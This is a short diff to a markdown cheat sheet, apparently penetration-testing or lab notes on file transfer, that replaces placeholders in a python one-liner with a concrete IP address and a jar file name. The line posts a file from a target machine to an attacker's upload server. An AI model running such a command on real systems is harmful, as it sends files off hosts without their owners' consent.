@@ -16,7 +16,7 @@ python3 -m uploadserver
 ```
 
 ```shell
-python3 -c 'import requests;requests.post("http://<ip>:8000/upload",files={"files":open("<file path>","rb")})'
+python3 -c 'import requests;requests.post("http://10.10.14.121:8000/upload",files={"files":open("cloudhosting-0.0.1.jar","rb")})'
 ```
 
 ## PHP
